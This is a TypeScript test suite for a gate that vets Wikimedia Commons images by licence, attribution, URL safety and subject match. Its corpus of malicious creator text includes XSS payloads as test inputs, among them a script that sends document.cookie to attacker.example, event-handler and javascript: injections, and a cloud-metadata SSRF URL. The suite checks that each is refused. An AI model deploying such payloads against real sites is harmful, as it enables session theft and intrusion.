import { describe, expect, it } from 'vitest';
import {
  classifyImageUrl,
  containsActiveContent,
  evaluateImageCandidate,
  evaluateLicence,
  imageryFallbackFor,
  parseArtist,
  sanitizeMetadataText,
  type RawImageCandidate,
} from './gate';
import {
  IMAGERY_CONTRACT_VERSION,
  IMAGE_LICENCE_IDS,
  croppable,
  imagerySubjectKey,
  type ImageSubject,
} from '../schemas/imagery';

/**
 * THE ADVERSARIAL SUITE FOR SOMEBODY ELSE'S PHOTOGRAPH.
 *
 * Two things are being proved here, and only one of them is "the happy path
 * works".
 *
 * The first is **lawfulness**: nothing without a licence we can name, a creator
 * we can credit and a canonical page a reader can check ever becomes a record.
 * The allow-list is asserted verbatim, so widening it is a diff somebody has to
 * justify rather than a constant somebody edits.
 *
 * The second is **that a wiki anybody can edit cannot reach the DOM**. The
 * corpus below is the one that matters: not invented payloads, but the shapes
 * `extmetadata` actually takes — an anchor around a name, which must be parsed
 * and kept; a script tag, which must cost the file its acceptance; a
 * right-to-left override, which must be stripped before it can make a stored
 * credit render as a different name.
 *
 * Entirely pure. No fetch, no clock: `retrievedAt` is injected, which is also
 * what makes two runs of one input produce byte-identical records.
 */

const CONTEXT = {
  provider: 'wikimedia-commons',
  contractVersion: IMAGERY_CONTRACT_VERSION,
  retrievedAt: '2026-08-03T00:00:00.000Z',
};

const SUBJECT: ImageSubject = {
  kind: 'destination',
  id: 'entry-1',
  name: 'Ambervale Highlands',
  wikidataId: 'Q101',
  coordinates: { lat: 46.2, lng: 8.1 },
  hierarchy: ['Ambervale', 'Ambervale Highlands'],
};

const CANDIDATE_SUBJECT: ImageSubject = {
  kind: 'candidate',
  id: 'place-77',
  name: 'North Terrace Gardens',
  hierarchy: ['Ambervale'],
};

function candidate(overrides: Partial<RawImageCandidate> = {}): RawImageCandidate {
  return {
    fileTitle: 'File:Highland ridge at dawn.jpg',
    filePageUrl: 'https://commons.wikimedia.org/wiki/File:Highland_ridge_at_dawn.jpg',
    thumbnailUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/x.jpg/960px-x.jpg',
    width: 960,
    height: 640,
    mediaType: 'image/jpeg',
    metadata: {
      licenceShortName: 'CC BY 4.0',
      licence: 'cc-by-4.0',
      artist: '<a rel="nofollow" class="external text" href="https://example.org/people/42">Rae Aldwin</a>',
      attributionRequired: 'true',
    },
    match: {
      basis: 'wikidata_image_property',
      relationship: 'Q101|P18',
    },
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// The allow-list
// ---------------------------------------------------------------------------

describe('the licence allow-list', () => {
  /**
   * Asserted verbatim and in order.
   *
   * The point is not that these ten strings are magic. It is that adding an
   * eleventh — which is a one-word change in a constant, and always looks
   * reasonable at the moment somebody wants a picture — fails a test named after
   * the obligation, so the decision gets written down.
   */
  it('is exactly the ten licences that permit commercial use with attribution', () => {
    expect([...IMAGE_LICENCE_IDS]).toEqual([
      'CC0-1.0',
      'public-domain',
      'CC-PDM-1.0',
      'CC-BY-2.0',
      'CC-BY-2.5',
      'CC-BY-3.0',
      'CC-BY-4.0',
      'CC-BY-SA-2.0',
      'CC-BY-SA-3.0',
      'CC-BY-SA-4.0',
    ]);
  });

  it('refuses NonCommercial, NoDerivatives and non-free outright', () => {
    for (const shortName of [
      'CC BY-NC 4.0',
      'CC BY-NC-SA 3.0',
      'CC BY-ND 4.0',
      'Fair use',
      'All rights reserved',
    ]) {
      const verdict = evaluateLicence({ licenceShortName: shortName });
      expect(verdict.ok, shortName).toBe(false);
      if (!verdict.ok) expect(verdict.reason).toBe('unsupported_licence');
    }
  });

  it('refuses a file carrying a non-copyright restriction even when the licence is clean', () => {
    /*
     * The combination that is easy to get wrong: a perfectly CC BY-SA file whose
     * `Restrictions` field says `personality`, meaning the people in it did not
     * consent to commercial use. A block-list on licence strings alone waves it
     * through.
     */
    const verdict = evaluateLicence({
      licenceShortName: 'CC BY-SA 4.0',
      licence: 'cc-by-sa-4.0',
      restrictions: 'personality',
    });
    expect(verdict.ok).toBe(false);
    if (!verdict.ok) expect(verdict.detail).toContain('personality');
  });

  it('refuses a file whose two licence fields disagree', () => {
    const verdict = evaluateLicence({ licenceShortName: 'CC BY 4.0', licence: 'cc-by-sa-3.0' });
    expect(verdict.ok).toBe(false);
    if (!verdict.ok) expect(verdict.reason).toBe('unsupported_licence');
  });

  it('separates share-alike from modifiable, because cropping is the adaptation', () => {
    const by = evaluateLicence({ licenceShortName: 'CC BY 4.0' });
    const bySa = evaluateLicence({ licenceShortName: 'CC BY-SA 4.0' });
    expect(by.ok && by.licence.useTier).toBe('modifiable');
    expect(bySa.ok && bySa.licence.useTier).toBe('display_unmodified');
  });
});

// ---------------------------------------------------------------------------
// Acceptance
// ---------------------------------------------------------------------------

describe('accepted image', () => {
  it('carries every field a lawful credit needs, and the relationship that justifies it', () => {
    const outcome = evaluateImageCandidate(SUBJECT, candidate(), CONTEXT);
    expect(outcome.status).toBe('accepted');
    if (outcome.status !== 'accepted') return;

    const image = outcome.image;
    expect(image.fileTitle).toBe('File:Highland ridge at dawn.jpg');
    expect(image.filePageUrl).toContain('commons.wikimedia.org');
    expect(image.thumbnailUrl).toContain('upload.wikimedia.org');
    expect(image.width).toBe(960);
    expect(image.height).toBe(640);
    expect(image.mediaType).toBe('image/jpeg');
    expect(image.licenceId).toBe('CC-BY-4.0');
    expect(image.licenceUrl).toBeTruthy();
    expect(image.useTier).toBe('modifiable');
    expect(image.creator).toBe('Rae Aldwin');
    expect(image.creatorUrl).toBe('https://example.org/people/42');
    expect(image.attributionText).toContain('Rae Aldwin');
    expect(image.attributionText).toContain('Creative Commons Attribution 4.0');
    expect(image.attributionText).toContain('Wikimedia Commons');
    expect(image.subject.id).toBe('entry-1');
    expect(image.matchBasis).toBe('wikidata_image_property');
    expect(image.subjectConfidence).toBe('strong');
    expect(image.relationship).toBe('Q101|P18');
    expect(image.provider).toBe('wikimedia-commons');
    expect(image.contractVersion).toBe(IMAGERY_CONTRACT_VERSION);
    expect(image.retrievedAt).toBe(CONTEXT.retrievedAt);
  });

  it('never lets a share-alike photograph reach a surface that crops', () => {
    const shareAlike = evaluateImageCandidate(
      SUBJECT,
      candidate({ metadata: { licenceShortName: 'CC BY-SA 4.0', artist: 'Rae Aldwin' } }),
      CONTEXT,
    );
    expect(shareAlike.status).toBe('accepted');
    if (shareAlike.status !== 'accepted') return;

    expect(shareAlike.image.useTier).toBe('display_unmodified');
    // The only route to a croppable value, and it refuses this one.
    expect(croppable(shareAlike.image)).toBeNull();

    const permissive = evaluateImageCandidate(SUBJECT, candidate(), CONTEXT);
    if (permissive.status !== 'accepted') throw new Error('expected an accepted image');
    expect(croppable(permissive.image)?.useTier).toBe('modifiable');
  });

  it('scores confidence from the relationship, not from how good the picture looks', () => {
    const category = evaluateImageCandidate(
      SUBJECT,
      candidate({ match: { basis: 'verified_commons_category', relationship: 'Q101|commonswiki' } }),
      CONTEXT,
    );
    expect(category.status === 'accepted' && category.image.subjectConfidence).toBe('moderate');

    const search = evaluateImageCandidate(
      SUBJECT,
      candidate({ match: { basis: 'bounded_identity_search', relationship: 'Q101|search' } }),
      CONTEXT,
    );
    expect(search.status === 'accepted' && search.image.subjectConfidence).toBe('weak');
  });
});

// ---------------------------------------------------------------------------
// Refusals
// ---------------------------------------------------------------------------

describe('rejected licence', () => {
  it('is stored with its reason so a rebuild does not re-fetch and re-refuse it', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({ metadata: { licenceShortName: 'CC BY-NC-SA 4.0', artist: 'Rae Aldwin' } }),
      CONTEXT,
    );
    expect(outcome.status).toBe('rejected');
    if (outcome.status !== 'rejected') return;
    expect(outcome.rejection.reason).toBe('unsupported_licence');
    // The file is named, which is what makes the refusal reusable rather than
    // just a note that something once failed.
    expect(outcome.rejection.fileTitle).toBe('File:Highland ridge at dawn.jpg');
    expect(outcome.rejection.subject.id).toBe('entry-1');
    expect(outcome.rejection.retrievedAt).toBe(CONTEXT.retrievedAt);
  });

  it('treats an absent licence as a refusal rather than as permission', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({ metadata: { artist: 'Rae Aldwin' } }),
      CONTEXT,
    );
    expect(outcome.status === 'rejected' && outcome.rejection.reason).toBe('missing_licence');
  });
});

describe('incomplete attribution', () => {
  it('refuses a usable licence that arrived with nobody to credit', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({ metadata: { licenceShortName: 'CC BY 4.0', licence: 'cc-by-4.0' } }),
      CONTEXT,
    );
    expect(outcome.status === 'rejected' && outcome.rejection.reason).toBe('incomplete_attribution');
  });

  it('refuses an artist field that sanitises away to nothing', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({ metadata: { licenceShortName: 'CC BY 4.0', artist: '<span></span>   ' } }),
      CONTEXT,
    );
    expect(outcome.status === 'rejected' && outcome.rejection.reason).toBe('incomplete_attribution');
  });

  it('honours a supplied Attribution verbatim, in place of artist and credit', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({
        metadata: {
          licenceShortName: 'CC BY 4.0',
          artist: 'Rae Aldwin',
          credit: 'Own work',
          attribution: 'Photo: Rae Aldwin for the Ambervale Trust',
        },
      }),
      CONTEXT,
    );
    expect(outcome.status).toBe('accepted');
    if (outcome.status !== 'accepted') return;
    expect(outcome.image.attributionText).toContain('Photo: Rae Aldwin for the Ambervale Trust');
    expect(outcome.image.attributionText).not.toContain('Own work');
  });
});

describe('malicious creator text', () => {
  /**
   * The corpus.
   *
   * The first entry is not an attack — it is what a real `Artist` value looks
   * like, and it has to survive, because a gate that refused ordinary Commons
   * markup would leave the product with no images at all and somebody would
   * "fix" it by removing the gate.
   */
  const CORPUS: Array<{ name: string; artist: string; accepted: boolean; expect?: string }> = [
    {
      name: 'an ordinary external-link credit is parsed, not refused',
      artist: '<a rel="nofollow" class="external text" href="https://example.org/u/9">Ilse Marek</a> from Ambervale',
      accepted: true,
      expect: 'Ilse Marek from Ambervale',
    },
    {
      name: 'a script element costs the file its acceptance',
      artist: 'Ilse Marek<script>fetch("https://attacker.example/"+document.cookie)</script>',
      accepted: false,
    },
    {
      name: 'an inline event handler is active content, not a name',
      artist: '<a href="https://example.org" onmouseover="alert(1)">Ilse Marek</a>',
      accepted: false,
    },
    {
      name: 'an img with an onerror payload is refused',
      artist: '<img src=x onerror=alert(1)>Ilse Marek',
      accepted: false,
    },
    {
      name: 'an svg payload is refused before it can be rendered',
      artist: '<svg/onload=alert(1)>Ilse Marek',
      accepted: false,
    },
    {
      name: 'a javascript: creator link is refused',
      artist: '<a href="javascript:alert(1)">Ilse Marek</a>',
      accepted: false,
    },
    {
      name: 'an iframe is refused',
      artist: '<iframe src="https://attacker.example"></iframe>Ilse Marek',
      accepted: false,
    },
  ];

  it.each(CORPUS)('$name', ({ artist, accepted, expect: expected }) => {
    const outcome = evaluateImageCandidate(SUBJECT, candidate({
      metadata: { licenceShortName: 'CC BY 4.0', artist },
    }), CONTEXT);

    if (!accepted) {
      expect(outcome.status).toBe('rejected');
      if (outcome.status !== 'rejected') return;
      expect(outcome.rejection.reason).toBe('active_content');
      // The refusal detail is a fixed phrase, never the payload echoed back.
      expect(outcome.rejection.detail).toBe('markup in a text field');
      return;
    }

    expect(outcome.status).toBe('accepted');
    if (outcome.status !== 'accepted') return;
    expect(outcome.image.creator).toBe(expected);
    expect(outcome.image.creator).not.toContain('<');
    expect(outcome.image.attributionText).not.toContain('<');
    expect(outcome.image.creatorUrl).toBe('https://example.org/u/9');
  });

  it('strips a right-to-left override, so a stored credit renders as what was stored', () => {
    const reversed = `Ilse\u202e Marek`;
    expect(sanitizeMetadataText(reversed)).toBe('Ilse Marek');
    expect(sanitizeMetadataText('\u200b\u200b')).toBeNull();
  });

  it('never turns an entity back into a tag while decoding prose', () => {
    // A general entity decoder would produce `<script>` here and hand it on.
    const value = sanitizeMetadataText('Ilse &amp; Co &#x3C;script&#x3E;');
    expect(value).toBe('Ilse & Co &#x3C;script&#x3E;');
  });

  it('recognises a creator link that points inside a private network and drops only the link', () => {
    const parsed = parseArtist('<a href="http://169.254.169.254/latest/meta-data">Ilse Marek</a>');
    expect(parsed?.creator).toBe('Ilse Marek');
    expect(parsed?.creatorUrl).toBeUndefined();
  });

  it('flags active content on its own, so the rule is testable outside the gate', () => {
    expect(containsActiveContent('<a href="https://example.org">x</a>')).toBe(false);
    expect(containsActiveContent('<SCRIPT>x</SCRIPT>')).toBe(true);
  });
});

describe('unsafe URL', () => {
  it('refuses plaintext, credentials, private networks and unapproved hosts by name', () => {
    expect(classifyImageUrl('http://upload.wikimedia.org/a.jpg')).toMatchObject({
      ok: false,
      reason: 'unsafe_url',
    });
    expect(classifyImageUrl('https://user:pw@upload.wikimedia.org/a.jpg')).toMatchObject({
      ok: false,
      reason: 'unsafe_url',
    });
    expect(classifyImageUrl('javascript:alert(1)')).toMatchObject({ ok: false, reason: 'unsafe_url' });
    expect(classifyImageUrl('https://127.0.0.1/a.jpg')).toMatchObject({
      ok: false,
      reason: 'private_network_url',
    });
    expect(classifyImageUrl('https://10.1.2.3/a.jpg')).toMatchObject({
      ok: false,
      reason: 'private_network_url',
    });
    expect(classifyImageUrl('https://169.254.169.254/a.jpg')).toMatchObject({
      ok: false,
      reason: 'private_network_url',
    });
    expect(classifyImageUrl('https://en.wikipedia.org/a.jpg')).toMatchObject({
      ok: false,
      reason: 'unapproved_host',
    });
  });

  it('refuses any Google image endpoint, which is where an unread licence would arrive from', () => {
    for (const url of [
      'https://maps.googleapis.com/maps/api/place/photo?maxwidth=800&photo_reference=x',
      'https://lh3.googleusercontent.com/p/x=w800',
      'https://encrypted-tbn0.gstatic.com/images?q=x',
    ]) {
      expect(classifyImageUrl(url), url).toMatchObject({ ok: false, reason: 'unapproved_host' });
    }
  });

  it('refuses a scalable vector even when everything else about it is clean', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({
        mediaType: 'image/svg+xml',
        thumbnailUrl: 'https://upload.wikimedia.org/wikipedia/commons/a/ab/x.svg',
      }),
      CONTEXT,
    );
    expect(outcome.status === 'rejected' && outcome.rejection.reason).toBe('unsupported_svg');
  });

  it('refuses a media type that is not a raster image, and dimensions that are not real', () => {
    expect(
      evaluateImageCandidate(SUBJECT, candidate({ mediaType: 'application/pdf' }), CONTEXT),
    ).toMatchObject({ rejection: { reason: 'unsupported_media_type' } });

    expect(
      evaluateImageCandidate(SUBJECT, candidate({ width: 0, height: 0 }), CONTEXT),
    ).toMatchObject({ rejection: { reason: 'invalid_dimensions' } });

    // Renderable, and an icon rather than a photograph.
    expect(
      evaluateImageCandidate(SUBJECT, candidate({ width: 48, height: 48 }), CONTEXT),
    ).toMatchObject({ rejection: { reason: 'invalid_dimensions' } });
  });
});

describe('wrong subject', () => {
  it('refuses a match that rests only on the names looking alike', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({
        match: {
          basis: 'bounded_identity_search',
          relationship: 'name similarity 0.91',
          nameSimilarityOnly: true,
        },
      }),
      CONTEXT,
    );
    expect(outcome.status === 'rejected' && outcome.rejection.reason).toBe('weak_name_match');
  });

  it('refuses an identity a model chose, at any confidence it claims', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({
        match: {
          basis: 'wikidata_image_property',
          relationship: 'Q101|P18',
          modelSelected: true,
        },
      }),
      CONTEXT,
    );
    expect(outcome.status === 'rejected' && outcome.rejection.reason).toBe('model_selected_identity');
  });

  it('refuses a candidate with no checkable relationship at all', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({ match: { basis: null, relationship: 'found it somewhere' } }),
      CONTEXT,
    );
    expect(outcome.status === 'rejected' && outcome.rejection.reason).toBe('weak_name_match');
  });
});

describe('ambiguous same-name subject', () => {
  it('shows nothing rather than risking a photograph of the other place', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({
        match: {
          basis: 'bounded_identity_search',
          relationship: 'Q101|search',
          ambiguousWith: 3,
        },
      }),
      CONTEXT,
    );
    expect(outcome.status).toBe('rejected');
    if (outcome.status !== 'rejected') return;
    expect(outcome.rejection.reason).toBe('ambiguous_subject');
    expect(outcome.rejection.detail).toContain('3');
  });

  it('accepts a single unambiguous result from the same bounded search', () => {
    const outcome = evaluateImageCandidate(
      SUBJECT,
      candidate({
        match: {
          basis: 'bounded_identity_search',
          relationship: 'Q101|search',
          ambiguousWith: 1,
        },
      }),
      CONTEXT,
    );
    expect(outcome.status).toBe('accepted');
  });
});

// ---------------------------------------------------------------------------
// Subject keys and fallbacks
// ---------------------------------------------------------------------------

describe('subject keys', () => {
  it('prefers the durable identifier, so a reindex does not orphan every stored image', () => {
    expect(imagerySubjectKey({ kind: 'destination', id: 'entry-1', wikidataId: 'Q101' })).toBe(
      'destination:Q101',
    );
    // A renumbered index entry with the same Wikidata id keeps its picture.
    expect(imagerySubjectKey({ kind: 'destination', id: 'entry-9999', wikidataId: 'Q101' })).toBe(
      'destination:Q101',
    );
    expect(imagerySubjectKey({ kind: 'candidate', id: 'place-77' })).toBe('candidate:place-77');
  });
});

describe('destination fallback', () => {
  it('is a designed object derived from the coordinates, never an absence', () => {
    const fallback = imageryFallbackFor({
      kind: 'destination',
      id: 'entry-1',
      name: SUBJECT.name,
      coordinates: SUBJECT.coordinates,
    });
    expect(fallback.kind).toBe('regional_graphic');
    expect(fallback.label).toBe(SUBJECT.name);
    expect(fallback.hue).toBeGreaterThanOrEqual(0);
    expect(fallback.hue).toBeLessThan(360);
    expect(fallback.horizon).toBeGreaterThan(0);
    expect(fallback.horizon).toBeLessThan(1);
    // A textual equivalent that says what it is, so a screen reader is not told
    // there is a photograph here.
    expect(fallback.description).toContain(SUBJECT.name);
    expect(fallback.description).toMatch(/no freely licensed photograph/i);
  });

  it('is stable for one subject and different between two, so a place keeps its colour', () => {
    const first = imageryFallbackFor({ kind: 'destination', id: 'entry-1', name: 'A' });
    const again = imageryFallbackFor({ kind: 'destination', id: 'entry-1', name: 'A' });
    const other = imageryFallbackFor({ kind: 'destination', id: 'entry-2', name: 'B' });
    expect(again.hue).toBe(first.hue);
    expect(other.hue).not.toBe(first.hue);
  });

  it('draws the shape of the trip when a scope has more than one area', () => {
    const fallback = imageryFallbackFor({
      kind: 'scope',
      id: 'scope-1',
      name: 'Ambervale Highlands',
      coordinates: { lat: 46.2, lng: 8.1 },
      clusterCount: 4,
    });
    expect(fallback.kind).toBe('cluster_graphic');
    expect(fallback.marks).toBe(4);
    expect(fallback.description).toContain('4');
  });

  it('falls back to the name alone when there is no position to draw from', () => {
    const fallback = imageryFallbackFor({ kind: 'destination', id: 'entry-3', name: 'Nowhere Named' });
    expect(fallback.kind).toBe('typographic');
    expect(fallback.marks).toBe(0);
    expect(fallback.label).toBe('Nowhere Named');
  });

  it('never produces a non-finite geometry, whatever the coordinates say', () => {
    const fallback = imageryFallbackFor({
      kind: 'destination',
      id: 'entry-4',
      name: 'Edge Case',
      coordinates: { lat: 90, lng: -180 },
    });
    expect(Number.isFinite(fallback.horizon)).toBe(true);
    expect(Number.isFinite(fallback.drift)).toBe(true);
    expect(fallback.horizon).toBeGreaterThanOrEqual(0);
    expect(fallback.horizon).toBeLessThanOrEqual(1);
  });
});

describe('candidate fallback', () => {
  it('a place on a board with no photograph still gets a graphic and a description', () => {
    const fallback = imageryFallbackFor({
      kind: 'candidate',
      id: CANDIDATE_SUBJECT.id,
      name: CANDIDATE_SUBJECT.name,
      coordinates: { lat: 46.31, lng: 8.02 },
    });
    expect(fallback.kind).toBe('regional_graphic');
    expect(fallback.label).toBe(CANDIDATE_SUBJECT.name);
    expect(fallback.description).toContain(CANDIDATE_SUBJECT.name);
  });

  it('does not collide with the destination that contains it', () => {
    const place = imageryFallbackFor({ kind: 'candidate', id: 'entry-1', name: 'x' });
    const destination = imageryFallbackFor({ kind: 'destination', id: 'entry-1', name: 'x' });
    expect(place.hue).not.toBe(destination.hue);
  });
});
